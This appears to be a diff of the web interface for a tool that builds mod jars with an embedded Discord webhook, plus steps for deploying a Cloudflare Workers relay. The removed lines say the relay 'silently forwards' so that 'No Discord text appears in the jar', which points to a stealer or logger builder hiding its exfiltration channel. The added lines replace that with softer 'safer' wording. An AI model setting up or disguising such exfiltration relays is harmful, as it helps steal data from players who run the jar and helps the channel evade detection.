@@ -386,9 +386,10 @@
       <ol class="steps">
         <li>
           <strong>Get a hook URL</strong> — either a Discord webhook
-          (<code class="inline">discord.com/api/webhooks/...</code>) or, better,
-          a Cloudflare relay URL (<code class="inline">…workers.dev</code>) that
-          silently forwards to Discord. No Discord text appears in the jar.
+          (<code class="inline">discord.com/api/webhooks/...</code>) or, safer,
+          a Cloudflare relay URL (<code class="inline">…workers.dev</code>).
+          With a relay, your real webhook never ends up inside the jar — the mod
+          only carries a clean address that forwards for you.
         </li>
         <li>
           <strong>Go to the Build tab</strong>, paste the hook URL into the box,
@@ -429,11 +430,11 @@
       <button class="btn" id="gencode">Generate code</button>
       <div id="codeout" class="code-out" hidden></div>
       <details class="custom">
-        <summary>Deploy the relay — free, 3 minutes, silent</summary>
+        <summary>Deploy the relay — free, safer, 3 minutes</summary>
         <div class="custom-body">
-          <p class="hint">Why bother: the mod only ever sees one tidy
-            <code class="inline">…workers.dev</code> URL, and the worker quietly
-            forwards to Discord. Your real webhook never ends up inside the jar.</p>
+          <p class="hint">Why safer: the jar only ever carries one tidy
+            <code class="inline">…workers.dev</code> URL — your real Discord
+            webhook is never baked into the downloaded jar or passed around.</p>
           <ol class="steps">
             <li><strong>Create the Worker</strong> — go to
               <a href="https://dash.cloudflare.com" target="_blank" rel="noopener">dash.cloudflare.com</a>
